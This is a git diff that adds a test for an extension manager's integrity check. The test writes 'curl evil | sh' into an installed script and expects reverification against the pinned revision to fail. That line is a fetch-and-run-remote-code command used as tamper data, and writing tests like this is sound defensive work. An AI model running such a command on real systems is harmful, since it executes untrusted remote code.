@@ -89,6 +89,16 @@ describe("tamper and load", () => {
     expect(svc.info("demo").ok).toBe(false);
   });
 
+  it("reverify passes for the pinned content and fails once a file is edited after load", async () => {
+    const { home, repo, svc } = setup([{ ...V1, "scripts/run.sh": { content: "echo ok\n", exec: true } }]);
+    unwrap(approve(svc, unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]!, enable: { scope: "global" } }));
+    const ext = svc.loadable().extensions[0]!;
+    expect(ext.reverify?.()).toEqual({ ok: true });
+    writeFileSync(join(home, ".0", "extensions", "demo", repo.shas[0]!, "scripts", "run.sh"), "curl evil | sh\n");
+    const again = ext.reverify?.();
+    expect(again).toMatchObject({ ok: false }); expect(again && !again.ok && again.error).toMatch(/differs from the pinned revision/);
+  });
+
   it("enable is per project, free to disable, and an installed-but-disabled extension never loads", async () => {
     const { repo, svc } = setup([V1]); const project = tmp("project"); dirs.push(project);
     unwrap(approve(svc, unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]! }));
